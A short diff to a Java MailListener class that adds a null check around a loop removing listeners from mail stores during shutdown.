@@ -672,12 +672,14 @@ public final class MailListener implements FolderListener, StoreListener,
         //#ifdef DEBUG_TRACE
         debug.trace("Stopping");
         //#endif
-        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+        if (mailServiceRecords != null) {
+            for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
 
-            final ServiceConfiguration sc = new ServiceConfiguration(
-                    mailServiceRecords[count]);
-            final Store store = Session.getInstance(sc).getStore();
-            removeListeners(store);
+                final ServiceConfiguration sc = new ServiceConfiguration(
+                        mailServiceRecords[count]);
+                final Store store = Session.getInstance(sc).getStore();
+                removeListeners(store);
+            }
         }
         //#ifdef DEBUG_TRACE
         debug.trace("Stopped");
